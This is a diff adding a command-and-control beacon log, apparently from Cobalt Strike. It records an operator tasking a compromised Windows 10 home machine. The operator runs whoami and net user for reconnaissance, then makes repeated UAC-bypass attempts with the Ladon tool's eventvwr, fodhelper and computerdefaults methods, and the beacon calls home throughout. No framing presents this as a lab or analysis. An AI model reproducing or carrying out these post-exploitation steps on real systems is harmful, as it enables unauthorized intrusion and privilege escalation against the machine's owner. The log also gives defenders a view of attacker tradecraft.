@@ -1,0 +1,117 @@
+10/11 08:03:33 UTC [metadata] 124.127.18.53 <- 2.0.0.1; computer: NOT-FOUND-404; user: kaeiy; process: notepad.exe; pid: 8392; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+10/11 08:03:26 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+10/11 08:03:26 UTC [note] Bid: 1437474122  NT: 10.0
+10/11 08:03:26 UTC [task] <T1029> Tasked beacon to become interactive
+10/11 08:03:30 UTC [input] <admin> sleep 0
+10/11 08:03:30 UTC [task] <T1029> Tasked beacon to become interactive
+10/11 08:04:25 UTC [checkin] host called home, sent: 48 bytes
+10/11 08:20:08 UTC [input] <admin1> shell whoami
+10/11 08:20:08 UTC [task] <T1059> Tasked beacon to run: whoami
+10/11 08:20:08 UTC [checkin] host called home, sent: 37 bytes
+10/11 08:20:08 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
+10/11 08:20:12 UTC [input] <admin1> shell net user
+10/11 08:20:12 UTC [task] <T1059> Tasked beacon to run: net user
+10/11 08:20:12 UTC [checkin] host called home, sent: 39 bytes
+10/11 08:20:12 UTC [output]
+received output:
+
+\\NOT-FOUND-404 的用户帐户
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+kaeiy                    WDAGUtilityAccount       
+命令成功完成。
+
+
+
+10/11 08:21:10 UTC [output]
+Ladon BypassUAC eventvwr
+
+10/11 08:21:13 UTC [checkin] host called home, sent: 500029 bytes
+10/11 08:21:16 UTC [output]
+received output:
+Ladon 9.2.0
+Start: 2023-10-11 16:22:01
+PC Name: NOT-FOUND-404 Lang: zh-CN
+Runtime: .net 4.0  ME: x64 OS: x64
+OS Name: Microsoft Windows 10 家庭中文版
+Machine Make: Hasee Computer
+RunUser: kaeiy PR: -IsUser
+
+
+10/11 08:21:16 UTC [output]
+received output:
+PID: 10552  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 10813 MB
+
+Load BypassUAC
+ [x] Base-64 字符数组或字符串的长度无效。
+
+
+10/11 08:24:18 UTC [output]
+Ladon BypassUAC eventvwr
+
+10/11 08:24:20 UTC [checkin] host called home, sent: 500041 bytes
+10/11 08:24:23 UTC [output]
+received output:
+Ladon 9.2.0
+Start: 2023-10-11 16:25:08
+PC Name: NOT-FOUND-404 Lang: zh-CN
+Runtime: .net 4.0  ME: x64 OS: x64
+OS Name: Microsoft Windows 10 家庭中文版
+Machine Make: Hasee Computer
+RunUser: kaeiy PR: -IsUser
+PID: 1920  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 10809 MB
+
+Load BypassUAC
+
+
+10/11 08:24:40 UTC [output]
+Ladon BypassUAC fodhelper
+
+10/11 08:24:42 UTC [checkin] host called home, sent: 500043 bytes
+10/11 08:24:45 UTC [output]
+received output:
+Ladon 9.2.0
+Start: 2023-10-11 16:25:30
+PC Name: NOT-FOUND-404 Lang: zh-CN
+Runtime: .net 4.0  ME: x64 OS: x64
+OS Name: Microsoft Windows 10 家庭中文版
+Machine Make: Hasee Computer
+RunUser: kaeiy PR: -IsUser
+PID: 4820  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 10808 MB
+
+Load BypassUAC
+
+
+10/11 08:24:59 UTC [output]
+Ladon BypassUAC computerdefaults
+
+10/11 08:25:02 UTC [checkin] host called home, sent: 500057 bytes
+10/11 08:25:05 UTC [output]
+received output:
+Ladon 9.2.0
+Start: 2023-10-11 16:25:50
+PC Name: NOT-FOUND-404 Lang: zh-CN
+Runtime: .net 4.0  ME: x64 OS: x64
+OS Name: Microsoft Windows 10 家庭中文版
+Machine Make: Hasee Computer
+RunUser: kaeiy PR: -IsUser
+PID: 15252  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 10807 MB
+
+Load BypassUAC
+
+
+10/11 08:28:28 UTC [input] <admin1> exit
+10/11 08:28:28 UTC [task] <> Tasked beacon to exit
+10/11 08:28:28 UTC [checkin] host called home, sent: 8 bytes
+10/11 08:28:28 UTC [output]
+beacon exit.
+
